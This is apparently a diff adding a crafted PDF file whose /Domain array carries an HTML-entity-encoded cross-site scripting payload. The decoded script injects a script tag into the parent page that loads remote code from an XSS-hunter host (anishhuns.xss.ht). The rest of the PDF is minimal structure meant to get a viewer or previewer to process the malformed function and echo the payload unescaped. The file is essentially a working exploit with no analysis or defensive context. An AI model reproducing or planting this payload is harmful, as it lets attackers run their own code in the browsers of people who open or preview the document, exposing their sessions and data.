@@ -1,0 +1,84 @@
+/%PDF-1.4
+1 0 obj
+<<
+  /FunctionType 4
+  /Domain [("><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;anishhuns.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">) 0]
+  /Range [0 0]
+  /Length 12
+>>
+stream
+{
+  0 add
+}
+endstream
+endobj
+2 0 obj
+<<
+  /Type /Catalog
+  /Pages 3 0 R
+>>
+endobj
+3 0 obj
+<<
+  /Type /Pages
+  /Kids [6 0 R]
+  /Count 1
+>>
+endobj
+4 0 obj
+[ /Indexed
+  [ /DeviceN
+    [/Cyan /Black]
+    /DeviceCMYK
+    1 0 R
+  ]
+  1(123)
+]
+endobj
+5 0 obj
+<<
+  /Type /XObject
+  /Subtype /Image
+  /Width 1
+  /Height 1
+  /ColorSpace 4 0 R
+  /BitsPerComponent 8
+  /Length 1
+>>
+stream
+x
+endstream
+endobj
+6 0 obj
+<<
+  /Type /Page
+  /Parent 3 0 R
+  /Resources
+  <<
+    /XObject << /Im5 5 0 R >>
+  >>
+  /MediaBox [0 0 100 100]
+  /Contents 7 0 R
+>>
+endobj
+7 0 obj
+<<
+  /Length 100
+>>
+stream
+  1  1  1  rg
+  0  0  100 100 re  f
+  BT
+    /Para << /MCID 1 >>
+    BDC
+      /Im5 Do
+    EMC
+  ET
+endstream
+endobj
+trailer
+<<
+  /Root 2 0 R
+>>
+startxref
+%%EOF
